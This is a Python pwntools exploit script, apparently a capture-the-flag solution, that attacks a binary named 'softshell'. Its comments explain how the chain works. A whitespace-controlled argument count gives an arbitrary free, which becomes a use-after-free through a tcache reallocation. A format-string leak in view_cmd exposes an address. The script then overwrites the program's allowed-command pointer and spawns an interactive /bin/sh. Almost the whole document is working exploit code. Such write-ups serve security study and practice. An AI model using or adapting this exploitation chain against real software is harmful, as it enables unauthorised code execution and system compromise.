#!/usr/bin/env python3

from pwn import *

elf = ELF("./softshell")
context.binary = elf

gdb_cmds = []
r = ["localhost",8888]

def conf():
	if args.REMOTE:
		p = remote(r[0],r[1])
	else:
		p = process([elf.path])
		if args.GDB:
			gdb.attach(p,gdbscript='\n'.join(gdb_cmds))
	return p

p = conf()

def send(s):
	p.readuntil(" >> ")
	p.sendline(s)

def main():

	free_offset = 22

	# The vulnerability: In add_cmd, argslen is set by counting the
	# amount of times the whitespace character appears in the command,
	# while args is increased correctly using strtok. Because of how
	# argslen is checked, if a user supplied 'command       two',
	# node->argslen would be 8 while the length of node->args is
	# only 2. del_arg deletes the last element of a node's args based on
	# argslen. Because argslen is controllable via whitespace, we have a
	# free primitive. Assuming there is a command node that comes after
	# the one with the payload, parts of the next node can be freed.
	# node->tag gets placed in the tcache with a size of 0x30. run_cmd's
	# feedback ability mallocs with a suitable size for this freed chunk,
	# creating a UAF of tag's pointer. The address of allowed can be found
	# using the format string vulnerability in view_cmd, the address of
	# currIndex is on the stack and is stored next to allowed, so it
	# can be easily calculated. The UAF can be used to point tag to
	# allowed. edit_tag can now be used to change allowed to something
	# useful and any command can be executed using the program's functionality.

	# set up nodes
	send("1")
	## format vuln and argslen arb write (offset to 3rd node's tag)
	send("%10$p"+' '*free_offset+"foo")
	send("format string and argslen payload")
	send("1")
	## padding
	send("dummy command")
	send("command node for padding")
	send("1")
	## target
	send("target to free")
	send("UAF against this node's tag")

	# leak and calculate allowed
	send("2")
	send("0")
	send("0")
	allowed = int(str(p.readuntil("\n"))[2:-3],16)+16
	log.info("allowed @ "+str(hex(allowed)))

	# arb free third nodes tag
	## free via incorrectly created argslen
	send("5")
	send("0")
	## malloc via feedback
	send("4")
	send("0")
	send("y")
	send(p64(allowed))

	# overwrite allowed via edit tag
	send("3")
	send("2")
	send("/bin/sh")

	# add node and run
	send("1")
	send("/bin/sh")
	send("win")
	send("4")
	send("3")

	p.interactive()


if __name__ == "__main__":
	main()
